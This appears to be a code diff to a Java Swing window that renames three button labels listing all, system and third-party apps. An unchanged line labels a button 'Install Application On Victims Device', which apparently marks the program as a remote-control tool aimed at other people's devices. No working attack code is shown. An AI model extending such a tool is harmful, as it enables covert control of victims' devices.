@@ -34,11 +34,11 @@ public class App_man extends javax.swing.JFrame {
 
         setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
 
-        jButton1.setText("List Of All Application");
+        jButton1.setText("List Of All Apps");
 
-        jButton2.setText(" List Of System Application");
+        jButton2.setText(" List Of System Apps");
 
-        jButton3.setText("List Of Third-Party Application");
+        jButton3.setText("List Of Third-Party Apps");
 
         jButton4.setText("Install Application On Victims Device");
 
